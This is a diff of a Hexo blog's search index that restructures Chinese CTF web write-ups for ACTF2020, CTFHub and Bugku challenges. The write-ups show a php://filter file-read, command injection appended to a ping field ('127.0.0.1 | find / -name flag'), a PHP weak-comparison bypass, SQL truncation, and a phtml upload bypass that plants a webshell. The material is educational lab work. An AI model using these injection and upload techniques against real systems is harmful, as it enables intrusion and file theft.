@@ -1,73 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2020/undefined/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<a id="more"></a>
-
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>ACTF2020 新生赛 -- WP</title>
-    <url>/2020/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<blockquote>
-<p>做题思路记录，同时感谢赵师傅和Y1NG的环境与源码</p>
-</blockquote>
-<p>@[TOC]</p>
-<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>主页显示是一个链接，点进去看看，URL出现file=，结合题目判断为文件包含<br><img src="https://img-blog.csdnimg.cn/20200518155754767.png" alt="在这里插入图片描述"><br>用伪协议读flag.php，一般语句为<code>php://filter/read=convert.base64-encode/resource=xxx</code></p>
-<blockquote>
-<p>php:// 输入输出流<br>php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写<br>read=convert.base64-encode读出来的文件base64加密<br>resource=xxx读取文件路径（相对/绝对）<br>文件读取可以参考<a href="https://www.freebuf.com/articles/web/182280.html">这篇文章</a></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200518160523628.png" alt="在这里插入图片描述"><br>解密即可<br><img src="https://img-blog.csdnimg.cn/20200518160542772.png" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>exec，这不是php里面命令执行的函数嘛，主页是个ping的api<br><img src="https://img-blog.csdnimg.cn/2020051816072354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到ping首先想到命令执行漏洞，此题似乎没有任何过滤，直接淦就完了<br>先看看flag在不在本目录（因为搜索耗时太长）<code>127.0.0.1 | ls</code>，用<code>|</code>可以只输出后面命令执行的结果，如果想都输出可以用<code>||</code>，<code>;</code><br><img src="https://img-blog.csdnimg.cn/20200518161658119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并没有，那就找吧，<code>127.0.0.1 | find / -name flag</code>，多等一会，这是从根目录开始find的<br><img src="https://img-blog.csdnimg.cn/2020051816180858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到了，直接cat就好<br><img src="https://img-blog.csdnimg.cn/20200518161832616.png" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>题目就已经提示了是文件备份</p>
-<blockquote>
-<p>常见文件备份有 <code>.swp(vim未正常退出备份)</code> <code>.bak</code> <code>.back</code><br>暂时就知道这么多，持续更</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200518162746342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载后给了源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;<span class="comment">//包含flag文件</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;<span class="comment">//获取key参数</span></span><br><span class="line">	    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">	    <span class="keyword">if</span>(!is_numeric($key)) &#123;<span class="comment">//判断key是否为数值OR数字字符串，不仅可以检查10进制，16进制也可以</span></span><br><span class="line">	        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);<span class="comment">//不是则退出脚本</span></span><br><span class="line">	    &#125;</span><br><span class="line">	    $key = intval($key);<span class="comment">//获取变量整数数值</span></span><br><span class="line">	    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">	    <span class="keyword">if</span>($key == $str) &#123;<span class="comment">//弱比较</span></span><br><span class="line">	        <span class="keyword">echo</span> $flag;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。所以直接传入key=123就行<br>参考：<a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a><br><img src="https://img-blog.csdnimg.cn/20200518164306276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-</blockquote>
-<hr>
-<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>鼠标悬浮在小灯泡上出现上传处<br><img src="https://img-blog.csdnimg.cn/2020051816463558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先传个一句话试试，看看源码是不是前端限制<br><img src="https://img-blog.csdnimg.cn/20200518164713804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到了，前端限制，可以在console里面把函数置空，也可以在bp里面改后缀，我是在console里面弄得，发现后端也有限制<br><img src="https://img-blog.csdnimg.cn/20200518164947205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改改后缀试试，php3,php4,php5,pht,phtml,先上传了个图片，看看给不给路径<br><img src="https://img-blog.csdnimg.cn/20200518165132766.png" alt="在这里插入图片描述"><br>pht也能上传成功，但是不能连上，应该是没配置这个选项，最终用的phtml后缀，上antsword<br><img src="https://img-blog.csdnimg.cn/20200518165654746.png" alt="在这里插入图片描述"></p>
-<hr>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
-      <tags>
-        <tag>信息安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2017-赛客夏令营-Web全家桶</title>
-    <url>/2020/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<blockquote>
+    <url>/2020/197BKC8/</url>
+    <content><![CDATA[<blockquote>
 <p>题目来自CTFHub，感谢平台的复现环境</p>
 </blockquote>
 <hr>
-<p>@<a href="2017-%E8%B5%9B%E5%AE%A2%E5%A4%8F%E4%BB%A4%E8%90%A5">TOC</a></p>
+<!-- TOC -->
+
+<ul>
+<li><a href="#injection-v20">Injection V2.0</a></li>
+<li><a href="#uploadddd">Uploadddd</a></li>
+<li><a href="#weakphp">weakphp</a></li>
+<li><a href="#random">random</a></li>
+<li><a href="#injection">injection</a></li>
+<li><a href="#checkin">checkin</a></li>
+<li><a href="#fast-running">Fast Running</a></li>
+<li><a href="#done">DONE</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
 <hr>
 <h1 id="Injection-V2-0"><a href="#Injection-V2-0" class="headerlink" title="Injection V2.0"></a>Injection V2.0</h1><blockquote>
 <p>登陆查询的两种方式，<a href="https://www.cnblogs.com/hello-py/articles/13509942.html">参考博客</a></p>
@@ -126,14 +80,65 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACTF2020 新生赛 -- WP</title>
+    <url>/2020/3F66KMD/</url>
+    <content><![CDATA[<blockquote>
+<p>做题思路记录，同时感谢赵师傅和Y1NG的环境与源码</p>
+</blockquote>
+<!-- TOC -->
+
+<ul>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Binclude">[ACTF2020 新生赛]Include</a></li>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec">[ACTF2020 新生赛]Exec</a></li>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bbackupfile">[ACTF2020 新生赛]BackupFile</a></li>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bupload">[ACTF2020 新生赛]Upload</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+<hr>
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>主页显示是一个链接，点进去看看，URL出现file=，结合题目判断为文件包含<br><img src="https://img-blog.csdnimg.cn/20200518155754767.png" alt="在这里插入图片描述"><br>用伪协议读flag.php，一般语句为<code>php://filter/read=convert.base64-encode/resource=xxx</code></p>
+<blockquote>
+<p>php:// 输入输出流<br>php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写<br>read=convert.base64-encode读出来的文件base64加密<br>resource=xxx读取文件路径（相对/绝对）<br>文件读取可以参考<a href="https://www.freebuf.com/articles/web/182280.html">这篇文章</a></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200518160523628.png" alt="在这里插入图片描述"><br>解密即可<br><img src="https://img-blog.csdnimg.cn/20200518160542772.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>exec，这不是php里面命令执行的函数嘛，主页是个ping的api<br><img src="https://img-blog.csdnimg.cn/2020051816072354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到ping首先想到命令执行漏洞，此题似乎没有任何过滤，直接淦就完了<br>先看看flag在不在本目录（因为搜索耗时太长）<code>127.0.0.1 | ls</code>，用<code>|</code>可以只输出后面命令执行的结果，如果想都输出可以用<code>||</code>，<code>;</code><br><img src="https://img-blog.csdnimg.cn/20200518161658119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并没有，那就找吧，<code>127.0.0.1 | find / -name flag</code>，多等一会，这是从根目录开始find的<br><img src="https://img-blog.csdnimg.cn/2020051816180858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到了，直接cat就好<br><img src="https://img-blog.csdnimg.cn/20200518161832616.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>题目就已经提示了是文件备份</p>
+<blockquote>
+<p>常见文件备份有 <code>.swp(vim未正常退出备份)</code> <code>.bak</code> <code>.back</code><br>暂时就知道这么多，持续更</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200518162746342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载后给了源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;<span class="comment">//包含flag文件</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;<span class="comment">//获取key参数</span></span><br><span class="line">	    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">	    <span class="keyword">if</span>(!is_numeric($key)) &#123;<span class="comment">//判断key是否为数值OR数字字符串，不仅可以检查10进制，16进制也可以</span></span><br><span class="line">	        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);<span class="comment">//不是则退出脚本</span></span><br><span class="line">	    &#125;</span><br><span class="line">	    $key = intval($key);<span class="comment">//获取变量整数数值</span></span><br><span class="line">	    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">	    <span class="keyword">if</span>($key == $str) &#123;<span class="comment">//弱比较</span></span><br><span class="line">	        <span class="keyword">echo</span> $flag;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。所以直接传入key=123就行<br>参考：<a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a><br><img src="https://img-blog.csdnimg.cn/20200518164306276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</blockquote>
+<hr>
+<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>鼠标悬浮在小灯泡上出现上传处<br><img src="https://img-blog.csdnimg.cn/2020051816463558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先传个一句话试试，看看源码是不是前端限制<br><img src="https://img-blog.csdnimg.cn/20200518164713804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到了，前端限制，可以在console里面把函数置空，也可以在bp里面改后缀，我是在console里面弄得，发现后端也有限制<br><img src="https://img-blog.csdnimg.cn/20200518164947205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改改后缀试试，php3,php4,php5,pht,phtml,先上传了个图片，看看给不给路径<br><img src="https://img-blog.csdnimg.cn/20200518165132766.png" alt="在这里插入图片描述"><br>pht也能上传成功，但是不能连上，应该是没配置这个选项，最终用的phtml后缀，上antsword<br><img src="https://img-blog.csdnimg.cn/20200518165654746.png" alt="在这里插入图片描述"></p>
+<hr>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-login1(SKCTF) writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
+    <url>/2019/38Y30XQ/</url>
+    <content><![CDATA[<blockquote>
+<p>SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的</p>
+</blockquote>
+<a id="more"></a>
 <hr>
-<h6 id="收获：SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的"><a href="#收获：SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的" class="headerlink" title="收获：SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的"></a>收获：SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的</h6><hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题传送门：<a href="http://123.206.31.85:49163/">http://123.206.31.85:49163/</a><br><img src="https://img-blog.csdnimg.cn/20190713134135424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接：<br><img src="https://img-blog.csdnimg.cn/20190713134221556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登陆？万能密码搞一下<br><img src="https://img-blog.csdnimg.cn/20190713134419350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>，，，不行啊，有个注册账号，试试去，随意注册一个，登进去看看再说<br><img src="https://img-blog.csdnimg.cn/20190713134542133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>额，这样啊，回去看看提示，嗯，，约束攻击</p>
 <p>攻击之前先来了解一些知识点吧，拿小本本记下来</p>
@@ -148,52 +153,33 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-web2 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190624140141327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+    <url>/2019/3XFAPMB/</url>
+    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190624140141327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<a id="more"></a>
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>打开链接<br><img src="https://img-blog.csdnimg.cn/20190624140621950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不能查看源码，那就点击<code>F12</code></p>
 <h2 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h2><p><img src="https://img-blog.csdnimg.cn/20190624140725293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 ]]></content>
       <categories>
         <category>CTF做题记录</category>
       </categories>
-  </entry>
-  <entry>
-    <title>BugkuCTF-web-web5 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>个人收获：各大浏览器均可在控制台里面解码JS的jother，另外，别忘记题目提示<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a href="http://123.206.87.240:8002/web5/">http://123.206.87.240:8002/web5/</a><br><img src="https://img-blog.csdnimg.cn/20190706131449616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接后,得到一个对话框<br><img src="https://img-blog.csdnimg.cn/20190706131525541.png" alt="在这里插入图片描述"><br>随便输<br><img src="https://img-blog.csdnimg.cn/20190706131616839.png" alt="在这里插入图片描述"><br>没啥可用的东西，查看源码，得到超长编码，由于编码太长，这里我就不把它粘贴出来了，这是JS的jother编码，大多数浏览器的控制台都能直接解析它，只需要将编码复制到Console中，敲Enter即可<br>例如：Chrome浏览器<br><img src="https://img-blog.csdnimg.cn/20190706133047889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Firefox浏览器<br><img src="https://img-blog.csdnimg.cn/20190706133324451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到的flag提交以下发现并不对<br><img src="https://img-blog.csdnimg.cn/20190706133425291.png" alt="在这里插入图片描述"><br>看一下题目描述，发现提示<code>字母大写</code>。。。<br>再提交一次<code>CTF&#123;WHATFK&#125;</code><br><img src="https://img-blog.csdnimg.cn/2019070613354248.png" alt="在这里插入图片描述"><br>那这个就是flag啦，恭喜。</p>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>BugkuCTF-web-web3 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190629165133843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接后一直有弹窗，禁止使用即可，也可以直接在URL前加<code>view-source:</code><br>查看源代码，拖到最后发现<br><img src="https://img-blog.csdnimg.cn/20190629165308435.png" alt="在这里插入图片描述"><br>最后一串编码为<code>Unicode编码转换ASCII</code>，用<a href="http://tool.chinaz.com/tools/unicode.aspx">站长工具</a>即可完成转换</p>
-<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/20190629165515214.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-web基础$_GET writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++个人收获：学会GET传参<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+    <url>/2019/2MAS5CT/</url>
+    <content><![CDATA[<blockquote>
+<p>学会GET传参                                                                                   </p>
+</blockquote>
+<a id="more"></a>
+<hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190625091210365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>进入链接得到以下代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$what=$_GET[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> $what;</span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
@@ -203,13 +189,51 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugkuCTF-web-web5 writeup</title>
+    <url>/2019/2F98DT2/</url>
+    <content><![CDATA[<blockquote>
+<p>各大浏览器均可在控制台里面解码JS的jother，另外，别忘记题目提示</p>
+</blockquote>
+<a id="more"></a>
+<hr>
